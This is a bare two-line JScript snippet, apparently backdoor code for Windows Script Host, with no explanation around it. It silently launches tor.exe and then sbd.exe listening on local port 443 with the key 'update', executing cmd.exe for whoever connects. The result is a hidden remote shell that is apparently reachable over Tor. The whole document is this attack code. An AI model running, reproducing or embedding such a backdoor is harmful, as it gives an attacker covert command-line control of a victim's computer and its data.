var r = new ActiveXObject("WScript.Shell").Run("tor.exe -f config", 0);
var r = new ActiveXObject("WScript.Shell").Run("sbd.exe -a 127.0.0.1 -k update -r 0 -l -p 443 -e cmd.exe", 0);
